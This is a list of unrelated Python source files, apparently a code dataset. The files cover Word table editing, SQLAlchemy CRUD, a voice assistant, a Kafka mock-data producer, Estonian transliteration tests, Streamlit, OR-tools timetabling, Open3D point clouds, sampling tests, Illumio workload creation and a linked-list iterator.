    "# -*- coding: utf-8 -*-\nimport os\nfrom datetime import datetime\nimport docx\n\ndef get_root_path():\n    return os.path.dirname(os.path.abspath(__file__))\n\ndef get_current_date():\n    date=datetime(datetime.now().year,datetime.now().month,datetime.now().day,0,0,0)\n    return date.strftime(\"%Y%m%d\")\n\ndef get_file_path():\n    return get_root_path()+\"\\\\\"+get_current_date()+\".docx\"\n\ndef count_non_empty_cells_in_column(table,column_index):\n    count=0\n    for row in table.rows:\n        cell=row.cells[column_index]\n        if cell.text.strip():\n            count+=1\n    return count\n\nif __name__==\"__main__\":\n    document=docx.Document(get_file_path())\n    table=document.tables[1]\n    cell_col=1\n    cell_row=count_non_empty_cells_in_column(table,cell_col)\n    if(cell_row==0):\n        exit()\n    cell=table.cell(cell_row-1,cell_col)\n    # \u6e05\u7a7a\u5355\u5143\u683c\u4e2d\u7684\u6240\u6709\u5185\u5bb9\n    for paragraph in cell.paragraphs:\n        # \u6e05\u7a7a\u6bb5\u843d\u4e2d\u7684\u6587\u672c\n        paragraph.clear()\n        # \u5220\u9664\u6bb5\u843d\u4e2d\u7684\u56fe\u7247\n        for run in paragraph.runs:\n            for picture in run.inline_shapes:\n                paragraph._p.remove(run._r)\n    # \u83b7\u53d6\u5355\u5143\u683c\u4e2d\u7684\u6240\u6709\u6bb5\u843d\n    paragraphs=cell.paragraphs\n    # \u6e05\u7a7a\u5355\u5143\u683c\u4e2d\u7684\u6240\u6709\u6bb5\u843d\uff0c\u53ea\u4fdd\u7559\u4e00\u4e2a\u6bb5\u843d\n    while len(paragraphs)>1:\n        cell._element.remove(paragraphs[-1]._element)\n        del paragraphs[-1]\n    document.save(get_file_path())\n    print(f\"{get_file_path()} table[1] index[{cell_row-1}] \u6e05\u7a7a\u6210\u529f!\")\n",
    "from typing import List\nfrom sqlalchemy.orm import Session\nimport schemas\nfrom migration import models\n\n\ndef get_user(db: Session, user_id: int):\n    return db.query(models.User).filter(models.User.id == user_id).first()\n\n\ndef get_users(db: Session, skip: int = 0, limit: int = 100):\n    return db.query(models.User).offset(skip).limit(limit).all()\n\n\ndef create_user(db: Session, user: schemas.UserBase):\n    db_user = models.User(username=user.username, is_admin=user.is_admin)\n    db.add(db_user)\n    db.commit()\n    db.refresh(db_user)\n    return db_user\n\n\ndef update_user(db: Session, user_id: int,  user: schemas.UserBase,):\n    db_user = db.query(models.User).filter(models.User.id == user_id).first()\n    for key, value in user.model_dump().items():\n        # user\u3092\u518d\u30bb\u30c3\u30c8,model_dump()->\u8f9e\u66f8\u578b\u306b\u5909\u63db,items()->key,\u5024\u3092\u7e70\u308a\u8fd4\u3057\n        setattr(db_user, key, value)\n    db.commit()\n    db.refresh(db_user)\n    return db_user\n\n\ndef delete_user(db: Session, user_id: int):\n    db_user = db.query(models.User).filter(models.User.id == user_id).first()\n    db.delete(db_user)\n    db.commit()\n\n\ndef create_todo(db: Session, user_id: int, todo: schemas.TodoBase):\n    db_todo = models.Todo(\n        user_id=user_id, title=todo.title, content=todo.content)\n    db.add(db_todo)\n    db.commit()\n    db.refresh(db_todo)\n    return db_todo\n\n\ndef get_todos(db: Session, user_id: int, skip: int = 0, limit: int = 100):\n    return db.query(models.Todo).filter(models.Todo.user_id == user_id)\\\n        .offset(skip).limit(limit).all()\n\n\ndef update_todo(db: Session, user_id: int, todos: List[schemas.TodoUpdate]):\n    target_ids = map(lambda todo: todo.id, todos)\n    db_todo = db.query(models.Todo).filter(\n        models.Todo.user_id == user_id, models.Todo.id.in_(target_ids)).all()\n    for update in db_todo:\n        target_todo: schemas.TodoUpdate = list(filter(\n            lambda todo: todo.id == update.id, todos))[0]\n        update.title = target_todo.title\n        update.content = target_todo.content\n    db.commit()\n    for todo in db_todo:\n        db.refresh(todo)\n    return db_todo\n\n\ndef delete_todo(db: Session, user_id: int):\n    db_todo = db.query(models.Todo).filter(\n        models.Todo.user_id == user_id).all()\n    for delete_todo in db_todo:\n        db.delete(delete_todo)\n    db.commit()\n\n\ndef get_todo(db: Session, user_id: int, todo_id: int):\n    return db.query(models.Todo).filter(\n        models.Todo.user_id == user_id, models.Todo.id == todo_id).first()\n",
    "import speech_recognition as sr\nimport pyttsx3\nimport pywhatkit\nimport datetime\nimport wikipedia\n\nlistener = sr.Recognizer()\n\nmachine = pyttsx3.init()\n\ndef talk(text):\n    machine.say(text)\n    machine.runAndWait()\n\ndef input_instruction():\n    global instruction\n    try:\n        with sr.Microphone() as origin:\n            print(\"listening\")\n            speech = listener.listen(origin)\n            instruction = listener.recognize_google(speech)\n            instruction = instruction.lower()\n            if \"jarvis\" in instruction:\n                instruction = instruction.replace('jarvis', '')\n                print(instruction)\n\n    except Exception as e:\n        print(e)\n        instruction = \"\"\n    return instruction  \n\ndef play_Jarvis():\n    \n    instruction = input_instruction()\n    print(instruction)\n    if \"play\" in instruction:\n        song = instruction.replace('play',\"\")\n        talk(\"playing\" + song)\n        pywhatkit.playonyt(song)\n\n    elif 'time' in instruction:\n        time = datetime.datetime.now().strftime('%I:%M %p')\n        talk('Current time is ' + time)\n    elif 'date' in instruction:\n        date = datetime.datetime.now().strftime('%d/%m/%Y')\n        talk(\"Today's Date is \" + date)\n    elif 'how are you' in instruction:\n        talk('I am fine, how about you')\n\n    elif 'what is your name' in instruction:\n        talk('I am Jarvis, What can i do for you?')\n    elif 'who is' in instruction:\n        human = instruction.replace('who is',\" \")\n        info = wikipedia.summary(human, 1)\n        print(info)\n        talk(info)\n\n    else:\n        talk('please repeat')\n\nplay_Jarvis()\n",
    "from confluent_kafka import Producer\nimport random\nimport pandas as pd\nimport time\nfrom faker import Faker\nimport os\nimport json\nimport sys\nfrom dotenv import load_dotenv\nimport logging\n\n\ndef read_config():\n    \"\"\"\n    Reads the configuration from client.properties and returns it as a key-value map\n    \"\"\"\n    config = {}\n    with open(\"client.properties\") as fh:\n        for line in fh:\n            line = line.strip()\n            if len(line) != 0 and line[0] != \"#\":\n                parameter, value = line.strip().split(\"=\", 1)\n                config[parameter] = value.strip()\n    return config\n\n\ndef delivery_callback(err, msg):\n    \"\"\"Callback function to handle message delivery status of the stream\"\"\"\n    if err:\n        sys.stderr.write(\"%% Message failed delivery: %s\\n\" % err)\n    else:\n        sys.stderr.write(\n            \"%% Message delivered to %s [%d] @ %d\\n\"\n            % (msg.topic(), msg.partition(), msg.offset())\n        )\n\n\ndef read_csv_file(file_path: str) -> pd.DataFrame:\n    \"\"\"Load CSV file into a pandas DataFrame\"\"\"\n    return pd.read_csv(file_path)\n\n\ndef main():\n    load_dotenv()\n    config = read_config()\n    topic = os.environ.get(\"CONFLUENT_TOPIC\")\n    logging.basicConfig(level=logging.INFO, format=\"%(message)s\")\n\n    # Create a new producer instance\n    producer = Producer(config)\n\n    # Navigate to the mock-data parent directory to load CSV files\n    mock_data_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), \"..\"))\n\n    activities_csv_path = os.path.join(\n        mock_data_dir, \"static\", \"data\", \"activities.csv\"\n    )\n    users_csv_path = os.path.join(mock_data_dir, \"static\", \"data\", \"users.csv\")\n\n    activities_df = read_csv_file(activities_csv_path)\n    users_df = read_csv_file(users_csv_path)\n\n    # Create a Faker instance\n    fake = Faker()\n\n    try:\n        while True:\n            # Select a user based on the previously-generated mock data\n            user_id = random.choice(users_df[\"userid\"])\n            user_country = users_df.loc[\n                users_df[\"userid\"] == user_id, \"address_country_code\"\n            ].iloc[0]\n\n            # Select an activity based on the previously-generated mock data\n            activity_id = random.choice(activities_df[\"activity_id\"])\n            activity_name = activities_df.loc[\n                activities_df[\"activity_id\"] == activity_id,\n                \"activity_name\",\n            ].iloc[0]\n\n            # Select latitude and longitude coordinates based on user's address country\n            latlng = fake.local_latlng(country_code=user_country)\n\n            # Generate heart rate based on activity type\n            if activity_name in [\"Stand\", \"Sit\", \"Sleep\"]:\n                heart_rate = random.randint(40, 80)\n            elif activity_name in [\n                \"Run\",\n                \"HIIT\",\n                \"Swimming\",\n                \"Kickboxing\",\n                \"Multisport\",\n            ]:\n                heart_rate = random.randint(130, 205)\n            else:\n                heart_rate = random.randint(70, 150)\n\n            # Emit a random amount of heart rate readings for user\n            sensor_readings = random.randint(1, 4)\n\n            for _ in range(sensor_readings):\n                # Heart rate will change slightly each time\n                heart_rate = random.randint(\n                    round(heart_rate * 0.95), round(heart_rate * 1.1)\n                )\n\n                current_epoch_time = int(time.time())\n\n                hr_data = {\n                    \"user_id\": str(user_id),\n                    \"heart_rate\": str(heart_rate),\n                    \"timestamp\": str(current_epoch_time),\n                    \"meta\": {\n                        \"activity_id\": str(activity_id),\n                        \"location\": {\n                            \"latitude\": str(latlng[0]),\n                            \"longitude\": str(latlng[1]),\n                        },\n                    },\n                }\n\n                producer.produce(\n                    topic,\n                    key=json.dumps(hr_data[\"user_id\"]).encode(\"utf-8\"),\n                    value=json.dumps(hr_data).encode(\"utf-8\"),\n                )\n\n                logging.info(f\"Produced message to topic {topic}\")\n                logging.info(f\"User ID: {hr_data['user_id']}\")\n                logging.info(f\"Heart Rate: {hr_data['heart_rate']}\")\n                logging.info(f\"Timestamp: {hr_data['timestamp']}\\n\")\n\n                # Send any outstanding or buffered messages to the Kafka broker\n                producer.flush()\n\n                # Have a small gap between each sensor reading for the user\n                time.sleep(2)\n\n    except KeyboardInterrupt:\n        logging.info(\"Stream stopped sucessfully\")\n\n\nmain()\n",
    "# -*- coding: utf-8 -*-\n\nfrom __future__ import unicode_literals\n\nimport unittest\nimport unicodedata\n\nimport epitran\n\n\nclass TestQuechua(unittest.TestCase):\n    def setUp(self):\n        self.epi = epitran.Epitran('est-Latn')\n\n    # RULE 1\n    def test_kabi(self): \n        tr = self.epi.transliterate('kabi')\n        self.assertEqual(tr, 'k\u0251pi')\n\n    def test_kapi(self): \n        tr = self.epi.transliterate('kapi')\n        self.assertEqual(tr, 'k\u0251p\u02d0i')\n\n    def test_kappi(self): \n        tr = self.epi.transliterate('kappi')\n        self.assertEqual(tr, 'k\u0251p\u02d0\u02d0i')\n\n    def test_sodin(self): \n        tr = self.epi.transliterate('sodin')\n        self.assertEqual(tr, 'sot\u02b2in')\n\n    def test_kota(self): \n        tr = self.epi.transliterate('kota')\n        self.assertEqual(tr, 'kot\u02d0\u0251')\n\n    def test_pered(self): \n        tr = self.epi.transliterate('pered')\n        self.assertEqual(tr, 'peret')\n\n    # RULE 2\n    def test_k\u00f5rbgi(self): \n        tr = self.epi.transliterate('k\u00f5rbgi')\n        self.assertEqual(tr, 'k\u00f8rbk\u02d0i')\n    \n\n    # RULE 3\n    def test_h\u00e4bi(self): \n        tr = self.epi.transliterate('h\u00e4bi')\n        self.assertEqual(tr, '\u00e6pi')\n\n    def test_homme(self): \n        tr = self.epi.transliterate('homme')\n        self.assertEqual(tr, 'om\u02d0e')\n\n\n    # RULE 4\n    def test_siia(self): \n        tr = self.epi.transliterate('siia')\n        self.assertEqual(tr, 'si\u02d0ja')\n\n    def test_maia(self): \n        tr = self.epi.transliterate('maia')\n        self.assertEqual(tr, 'mai\u02d0ja')\n\n    def test_m\u00fc\u00fca(self): \n        tr = self.epi.transliterate('m\u00fc\u00fca')\n        self.assertEqual(tr, 'myija')\n\n    def test_j\u00e4nes(self): \n        tr = self.epi.transliterate('j\u00e4nes')\n        self.assertEqual(tr, 'j\u00e6nes')\n    \n    # RULE 5\n    def test_vere(self): \n        tr = self.epi.transliterate('vere')\n        self.assertEqual(tr, 'vere')\n    \n    def test_veere(self): \n        tr = self.epi.transliterate('veere')\n        self.assertEqual(tr, 've\u02d0re')\n    \n    def test_lina(self): \n        tr = self.epi.transliterate('lina')\n        self.assertEqual(tr, 'lin\u0251')\n    \n    def test_linna(self): \n        tr = self.epi.transliterate('lina')\n        self.assertEqual(tr, 'lin\u02d0\u0251')\n\n\n    # RULE 7\n    def test_du\u0161i(self): \n        tr = self.epi.transliterate('du\u0161i')\n        self.assertEqual(tr, 'tu\u0283\u02d0i')\n    \n\n    def test_k\u00e4sn(self): \n        tr = self.epi.transliterate('k\u00e4sn')\n        self.assertEqual(tr, 'k\u00e6\u0283\u02d0n')\n\n    def test_\u0161ahti(self): \n        tr = self.epi.transliterate('\u0161ahti')\n        self.assertEqual(tr, '\u0283\u0251hti')\n\n    def test_bluffi(self): \n        tr = self.epi.transliterate('bluffi')\n        self.assertEqual(tr, 'pluf\u02d0\u02d0i')\n\n    def test_fakti(self): \n        tr = self.epi.transliterate('fakti')\n        self.assertEqual(tr, 'fak\u02d0ti')\n\n    # RULE 9\n    def test_pani(self): \n        tr = self.epi.transliterate('pani')\n        self.assertEqual(tr, 'pan\u02b2i')\n\n    def test_lasi(self): \n        tr = self.epi.transliterate('lasi')\n        self.assertEqual(tr, 'las\u02b2i')\n    \n    def test_palju(self): \n        tr = self.epi.transliterate('palju')\n        self.assertEqual(tr, 'pal\u02b2ju')\n\n    def test_paljas(self): \n        tr = self.epi.transliterate('paljas')\n        self.assertEqual(tr, 'pal\u02b2jas')\n\n    def test_padi(self): \n        tr = self.epi.transliterate('padi')\n        self.assertEqual(tr, 'pat\u02b2i')\n",
    "import streamlit as st\r\n\r\ndef main():\r\n    st.markdown(\"<h3>About Us</h3>\", unsafe_allow_html=True)\r\n    st.write(\"Media Control with Hand Gestures is an innovative project that allows users to interact with media content using simple hand gestures. Gone are the days of relying solely on remote controls or keyboard shortcuts to manage your video playback experience. With this project, you can harness the power of hand gestures to effortlessly control media playback on your device.\")\r\n\r\n    st.write(\"It provides a seamless and intuitive way to navigate through your favorite videos without ever needing to touch a physical input device.\")\r\n    st.markdown(\"<h3>Key Gestures and Actions:</h3>\", unsafe_allow_html=True)\r\n\r\n    st.write(\"\ud83d\udd90\ufe0f Play/Pause: Show your left palm to play the video. When you want to pause, simply show your left fist.\")\r\n    st.write(\"\ud83d\udc4c Volume Control: Use your right hand to control the volume. Pinch in to decrease the volume, and pinch out to increase it.\")\r\n\r\n    st.markdown(\"<h3>Output Screens :</h3>\", unsafe_allow_html=True)\r\n    \r\n    st.image(\"scr1.png\", caption=\"Screenshot 1 - Decrease\", use_column_width=True)\r\n    st.image(\"scr2.png\", caption=\"Screenshot 2 - Increase\", use_column_width=True)\r\n    st.image(\"scr3.png\", caption=\"Screenshot 3 - Play\", use_column_width=True)\r\n    st.image(\"scr4.png\", caption=\"Screenshot 3 - Stop\", use_column_width=True)\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "from ortools.sat.python import cp_model\nimport time\n# INPUT\ndef input_data():\n    t,n,m=map(int, input().split())\n    course_class=[]; A=[]\n    for i in range(n):\n       A=list(map(int, input().split()))\n       A.pop(-1)\n       course_class.append(A)\n    course_teacher=[];B=[]\n    for i in range(t):\n        B=list(map(int,input().split()))\n        B.pop(-1)\n        course_teacher.append(B)\n    Credits=list(map(int,input().split()))\n    return t,n,m,course_class,course_teacher,Credits\nt,n,m,courses_for_class,courses_by_teacher,cre=input_data()\nteachers_for_course=[]\nfor course in range(1,m+1):\n    A=[]\n    for teacher,courses in enumerate(courses_by_teacher):\n        if course in courses:\n            A.append(teacher+1)\n    teachers_for_course.append(A)\n# INITIALIZE THE VARIABLES\ntime1=time.time()\nmodel=cp_model.CpModel()\nA={}\nfor clas in range(1,n+1):\n    for course in courses_for_class[clas-1]:\n            for teacher in teachers_for_course[course-1]:   \n                    for lesson in range(1,61):\n                        A[teacher,clas,course,lesson]=model.NewBoolVar('A['+str(teacher)+','+ str(clas)+','+ str(course)+','+ str(lesson)+']')\n# Constraints\nfor lesson in range(1,61):\n        for clas in range(1,n+1): \n                model.Add(sum(A[teacher,clas,course,lesson] for course in courses_for_class[clas-1] for teacher in teachers_for_course[course-1])<=1)\n        for teacher in range(1,t+1):\n                model.Add(sum(A[teacher,clas+1,course,lesson] for clas,courses in enumerate(courses_for_class) for course in courses if course in courses_by_teacher[teacher-1])<=1)\n\n\n\n# All the lessons of the course for a class have been assigned in consecutive order.\ncount={}\n\nfor j, courses in enumerate(courses_for_class):\n    for course in courses:\n        for teacher in teachers_for_course[course-1]:\n            for p in range(10):\n                t1=model.NewBoolVar('t1')\n                count[0]=model.NewIntVar(0,0,'count[0]')\n                for lesson in range(1,7):\n                            t2=model.NewBoolVar('t2')\n                            count[lesson]=model.NewIntVar(0,cre[course-1],'count['+str(lesson)+']')\n                            model.Add(A[teacher,j+1,course,lesson+6*p]==1).OnlyEnforceIf(t2)\n                            model.Add(A[teacher,j+1,course,lesson+6*p]!=1).OnlyEnforceIf(t2.Not())\n                            model.Add(count[lesson]==count[lesson-1]+1).OnlyEnforceIf(t2)\n                            model.Add(count[lesson]==0).OnlyEnforceIf(t2.Not())\n                model.Add(sum(count[lesson] for lesson in range(1,7))==int((cre[course-1]+1)*(cre[course-1])/2)*t1)\n\n\nfor i,courses in enumerate(courses_for_class):\n    for course in courses:     \n            model.Add(sum(A[teacher,i+1,course,lesson] for lesson in range(1,61)for teacher in teachers_for_course[course-1])<=cre[course-1])\n            for period in range(10):\n                for teacher in teachers_for_course[course-1]:\n                        t3=model.NewBoolVar('t3')\n                        model.Add(sum(A[teacher,i+1,course,lesson] for lesson in range(period*6+1,period*6+7) )==cre[course-1]*t3)\n\n#objective function\nmodel.Maximize(sum(A[teacher, clas,course,lesson]for clas in range(1,n+1)for course in courses_for_class[clas-1] for teacher in teachers_for_course[course-1]  for lesson in range(1,61)))\ntime2 = time.time()\nelapsed_time = round((time2 - time1)/60,2)\nprint (\"Moldelling time:{0}\".format(elapsed_time) + \"[min]\")\nsolver=cp_model.CpSolver()\nsolver.parameters.max_time_in_seconds=10800\nstatus=solver.Solve(model)\nif status==cp_model.OPTIMAL:\n    res=0\n    results=[]\n    for clas in range(1,n+1):\n        for course in courses_for_class[clas-1]:\n            for teacher in teachers_for_course[course-1]:   \n                    for lesson in range(1,61):\n                        if solver.Value(A[teacher,clas,course,lesson])==1:\n                            B=[clas,course,lesson,teacher]\n                            results.append(B)\n                            res+=1\n                            break\n                                    \n                            \n    print(res)\n    for i in results:\n        for j in i:\n            print(j,end=\" \")\n        print(\"\")\n                  \n                    \nelse:\n    print(\"No optimal solution found.\")\ntime3 = time.time()\nelapsed_time = round((time3- time2)/60,2)\nprint (\"solving_time:{0}\".format(elapsed_time) + \"[min]\")",
    "import open3d as o3d\r\nimport numpy as np\r\nimport matplotlib.pyplot as plt\r\n\r\nfrom math import radians\r\n\r\nclass PointCloudProcessor:\r\n\r\n    def __init__(self):\r\n        self.point_cloud_o3d = o3d.geometry.PointCloud()\r\n        self.point_cloud_crp = o3d.geometry.PointCloud()\r\n\r\n        \"\"\"\r\n            local 4x4 affine transformation matrix\r\n            identity       [:3, :3]  = rotation (R) , [0:3,3] = translation (T)\r\n            [1, 0, 0, 0,   [R, R, R, Tx,\r\n             0, 1, 0, 0,    R, R, R, Ty,\r\n             0, 0, 1, 0,    R, R, R, Tz,\r\n             0, 0, 0, 1]    0, 0, 0, 1]\r\n        \"\"\"\r\n        self.M                    = np.eye(4)\r\n        # individual translation components (for easy serialisation)\r\n        self.tx                   = 0\r\n        self.ty                   = 0\r\n        self.tz                   = 0\r\n        # individual rotation components (for easy serialisation)\r\n        self.rx                   = 0\r\n        self.ry                   = 0\r\n        self.rz                   = 0\r\n\r\n        self.box_width            = 3.0\r\n        self.box_height           = 0.75\r\n        self.box_depth            = 1.2\r\n\r\n        self.box_x                = 0.0\r\n        self.box_y                = -0.5\r\n        self.box_z                = -2.7\r\n\r\n        self.box_rx               = 0\r\n        self.box_ry               = 36\r\n        self.box_rz               = -5\r\n        self.crop_box             = self.make_box()\r\n\r\n        self.res_scale            = 1\r\n        self.depth_width          = 40\r\n        self.depth_height         = 30\r\n        self.res_width            = self.depth_width * self.res_scale\r\n        self.res_height           = self.depth_height * self.res_scale\r\n        self.num_pts              = self.res_width * self.res_height\r\n\r\n        self.use_rgb              = False\r\n        self.point_size           = 3.0\r\n        self.hide_original        = True\r\n        self.hide_cropped         = False\r\n\r\n        self.cluster_min_points   = 10\r\n        self.cluster_eps          = 0.45\r\n        self.box_extent_threshold = 0.7\r\n\r\n        self.frame_count          = 0\r\n        self.prev_bbs             = []\r\n        self.use_point_clustering = False\r\n\r\n        self.vis                  = None\r\n\r\n        self.amountIncrement      = 0.1\r\n\r\n    def move(self, x, y, z):\r\n        \"\"\"\r\n            applies relative offset to the original and cropped point clouds\r\n        \"\"\"\r\n        self.tx += x\r\n        self.ty += y\r\n        self.tz += z\r\n        self.M[:3,3] = (self.tx, self.ty, self.tz)\r\n\r\n    def rotate(self, delta_rx, delta_ry, delta_rz):\r\n        \"\"\"\r\n            applies relative rotation to the original and cropped point clouds\r\n\r\n            expects angles in degrees\r\n        \"\"\"\r\n        self.rx += delta_rx\r\n        self.ry += delta_ry\r\n        self.rz += delta_rz\r\n        self.M[:3, :3] = o3d.geometry.get_rotation_matrix_from_axis_angle([radians(self.rx),radians(self.ry), radians(self.rz)])\r\n\r\n    def make_box(self):\r\n        \"\"\"\r\n            makes an oriented bounding box to crop the point cloud by\r\n        \"\"\"\r\n        box = o3d.geometry.TriangleMesh.create_box(self.box_width, self.box_height, self.box_depth)\r\n        crop_box = box.get_oriented_bounding_box(False)\r\n        crop_box.color = [0, 0, 0]\r\n        crop_box.translate([self.box_x, self.box_y, self.box_z])\r\n        crop_box.rotate(o3d.geometry.get_rotation_matrix_from_axis_angle([radians(self.box_rx),radians(self.box_ry), radians(self.box_rz)]))\r\n        print(\"dbg\", crop_box,self.box_depth, self.box_width, self.box_height)\r\n        return crop_box\r\n\r\n    def get_clusters(self, pcd, apply_label_colors = True, compute_aabbs = True, eps=0.45, min_points=10):\r\n        \"\"\"\r\n            pcd - the point cloud to process\r\n\r\n            apply_label_colors - if true, uses plt to generate a colour map for the labels\r\n\r\n            compute_aabbs - if true, computes the axis aligned bounding box (aabb) of each point cloud cluster\r\n\r\n            eps - db scan algorith eps ratio (sensitivity)\r\n\r\n            min_points - the minimum number of points that can be considered a cluster\r\n            use a small number for sparse point clouds / a larger number for dense point clouds\r\n        \"\"\"\r\n        labels = np.asarray(pcd.cluster_dbscan(eps=eps, min_points=min_points, print_progress=False))\r\n        \r\n        if labels.size == 0:\r\n            return None, None\r\n\r\n        max_label = labels.max()\r\n\r\n        if apply_label_colors:\r\n            colors = plt.get_cmap(\"tab20\")(labels / max(max_label,1))\r\n            colors[labels < 0] = 0\r\n            pcd.colors = o3d.utility.Vector3dVector(colors[:, :3])\r\n\r\n        clusters = [pcd.select_by_index(list(np.where(labels == i)[0])) for i in range(max_label + 1)]\r\n        aabbs    = [cluster.get_axis_aligned_bounding_box() for cluster in clusters] if compute_aabbs else []\r\n\r\n        for aabb in aabbs:\r\n            aabb.color = [0, 0, 0]\r\n\r\n        return clusters, aabbs\r\n\r\n    def on_box_w_minus(self, ",
    "import pytest\nfrom math import isclose\n\nimport numpy as np\n\nimport jams.sampling\n\n\ndef eval_logcomp(x, mu, sig):\n    return -(len(x) * np.log(sig) + np.linalg.norm(x - mu, 2) ** 2 / sig) / 2\n\ndef test_acquisition():\n    def eval_logp(x):\n        return np.logaddexp(eval_logcomp(x, mu, sig1), eval_logcomp(x, -mu, sig2))\n    def eval_d_logp(x):\n        p = np.exp(eval_logp(x))\n        dp = -((x - mu) / sig1 * np.exp(eval_logcomp(x, mu, sig1)) + (x + mu) / sig2 * np.exp(eval_logcomp(x, -mu, sig2)))\n        return dp/p\n    d = 2\n    mu = 1\n    sig1 = np.sqrt(d / 100)\n    sig2 = sig1 / 2\n    rng = np.random.default_rng(0)\n    starting_points = rng.standard_normal(size=(32, d))\n    ctrl = jams.sampling.Controls()\n    modes, _ = jams.sampling.acquire_modes(eval_logp, eval_d_logp, starting_points, ctrl)\n    assert len(modes) == 2\n    assert np.all(np.isclose(mu, modes[0]))\n    assert np.all(np.isclose(-mu, modes[1]))\n\ndef test_sampling():\n    def eval_logp(x):\n        return np.logaddexp(eval_logcomp(x, mu, sig1), eval_logcomp(x, -mu, sig2))\n    def eval_d_logp(x):\n        p = np.exp(eval_logp(x))\n        dp = -((x - mu) / sig1 * np.exp(eval_logcomp(x, mu, sig1)) + (x + mu) / sig2 * np.exp(eval_logcomp(x, -mu, sig2)))\n        return dp/p\n    d = 2\n    mu = 1\n    sig1 = np.sqrt(d / 100)\n    sig2 = sig1 / 2\n    rng = np.random.default_rng(0)\n    starting_points = rng.standard_normal(size=(32, d))\n    sampler = jams.sampling.sample_posterior(eval_logp, eval_d_logp, starting_points, rng=rng)\n    samples = [next(sampler) for _ in range(int(1e5))]\n    x, i = (np.array(a) for a in zip(*samples[int(1e4):]))\n    assert isclose(.5, np.mean(i), rel_tol=1e-2)\n    assert np.all(np.isclose(mu, x[i == 0].mean(0), rtol=1e-2))\n    assert np.all(np.isclose(-mu, x[i == 1].mean(0), rtol=1e-2))\n",
    "#!/usr/bin/env python3\n\nimport argparse\nimport sys\nimport os\nimport json\nimport argparse\nimport uuid\nimport logging\nimport requests\nimport json\nimport socket\nimport sys\nimport ipaddress\nimport time\n\nfrom illumio import *\n\n# include regular expression module\nimport re\n\ndef ip_in_networks(ip, networks):\n    for network in networks:\n        print(\"IP: \" + str(ip) + \" Network: \" + str(network))\n        if ip in network:\n            return True\n    return False\n\ndef create_workload(pce, ip, simulate):\n    logging.debug(f\"Creating workload for IP {ip}\")\n    if not simulate:\n        logging.info(f\"Creating workload on PCE {ip}\")\n        workload = Workload(\n            name=f\"FlowLink-{str(ip)}\", \n            interfaces=[ \n                Interface( name='flowlink0', address=str(ip), link_state='up')\n            ]\n        )\n        workload = pce.workloads.create(workload)\n        logging.info(f\"Workload created: {workload.href} - {workload.name} - {ip}\")\n        return workload\n    else:\n        logging.info(f\"Simulating workload creation for IP {ip}\")\n        return None\n\ndef find_internal_ips(log_file_path, internal_networks):\n    internal_networks = [ipaddress.ip_network(network) for network in internal_networks]\n    logging.debug(\"Internal Networks: \" + str(internal_networks))\n\n    # keep log file open and wait for new lines to appear\n    with open(log_file_path, 'r') as file:\n        logging.info(\"Reading file: {}\".format(log_file_path))\n        file.seek(0, 2)  # Move to the end of the file\n        while True:\n            # be sure that the line matches : \n            # 2024-03-30T19:29:18.027820424Z 2024-03-30T19:29:18.027524+00:00 ***** Following new IP addresses found in flows: [170.72.41.92 184.185.103.69 23.218.217.180 82.64.102.158 217.20.50.39 193.122.61.43] \n\n            line = file.readline().rstrip() \n\n            if \"Following new IP addresses found in flows:\" in line:\n                workloads_created = 0\n                ip_addresses = re.findall(r'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', line)\n                for ip_address in ip_addresses:\n                    try:\n                        ip = ipaddress.ip_address(ip_address)\n                        logging.debug(\"IP: \" + str(ip))\n                        if ip_in_networks(ip, internal_networks):\n                            # exit loop when workloads_created is equal to max_workloads\n                            if max_workloads != 0 and workloads_created >= max_workloads:\n                                logging.info(f\"Max workloads ({max_workloads}) created.\")\n                                break\n                            # check if this is a workload on PCE\n                            logging.debug(\"Checking if IP is a workload on PCE\")\n                            workload = pce.workloads.get(params={'ip_address': str(ip)})\n                            workloads_created += 1\n                            if not workload:\n                                logging.info(f\"Internal IP {ip} is not a workload on PCE\")\n                                # create workload on PCE with a flowlink related name\n                                workload = create_workload(pce, ip, simulate)\n                            else:\n                                logging.debug(f\"Workload for IP {ip} already exists on PCE\")   \n                        else:\n                            logging.debug(\"IP {} is not in internal networks\".format(str(ip)))\n                    except ValueError:\n                        # Ignore IP addresses that are not valid\n                        continue\n            else:\n                logging.debug(\"No new IP addresses found in flows\")\n\n            time.sleep(10)  # Sleep for a short duration before checking for new lines\n\ndef parse_arguments():\n    parser = argparse.ArgumentParser(description='PCE Demo Host Credentials')\n    parser.add_argument('--pce_host', default=os.environ.get('PCE_HOST', 'poc1.illum.io'), help='Integer for the PCE demo host')\n    parser.add_argument('--pce_port', default=os.environ.get('PCE_PORT', 443), help='TCP port for the PCE connection')\n    parser.add_argument('--org_id', default=os.environ.get('PCE_ORG', 1), help='Organization ID for the PCE')\n    parser.add_argument('--api_user', default=os.environ.get('PCE_API_USER'), help='Optional username (default: demo@illumio.com)')\n    parser.add_argument('--api_key', default=os.environ.get('PCE_API_KEY'), help='Optional password (default: password)')\n    parser.add_argument('--verbose', help='Be more verbose (logging)')\n    parser.add_argument('--networks', default='192.168.0.0/16,172.16.0.0/12,10.0.0.0/8', help = 'Company networks listed comma separated')\n    parser.add_argument('--log_file', help = 'Path to the log file')\n    parser.add_argument('--simulate', help = 'Simulate the workload creation', default=False)\n    parser.add_argument('--max-workloads', help = 'Maximum number of workloads to create per run, 0 means unlimited', default=0)\n    return parser.parse_args()",
    "\"\"\"\nWrite an iterator for a doubly linked list\n\"\"\"\n\nclass ListNode:\n    def __init__(self,val:int,prev:\"ListNode\"=None,next:\"ListNode\"=None) -> None:\n        self.val = val\n        self.prev = prev\n        self.next = next\n\n    def __repr__(self) -> str:\n        return f\"ListNode :{self.val}\"\n\nclass LinkedList:\n    def __init__(self) -> None:\n        self.head,self.tail = self.build_list()\n\n    def build_list(self) -> tuple:\n        head,tail = ListNode(0),ListNode(0)\n        head.next = tail\n        tail.prev = head\n        return head,tail\n    \n    def add(self,val):\n        new_node = ListNode(val)\n        self.tail.prev.next = new_node\n        self.tail.prev = new_node\n\n    def __iter__(self):\n        self.it = self.head.next\n        return self\n    \n    def __next__(self):\n        if self.it and self.it.next:\n            return_val = self.it\n            self.it = self.it.next\n            return return_val\n        else:\n            raise StopIteration\n        \nimport random\nif __name__ == '__main__':\n    # driver code\n    list = LinkedList()\n    for _ in range(10):\n        list.add(int(10*random.random()))\n    \n    for node in list:\n        print(node)\n        ",
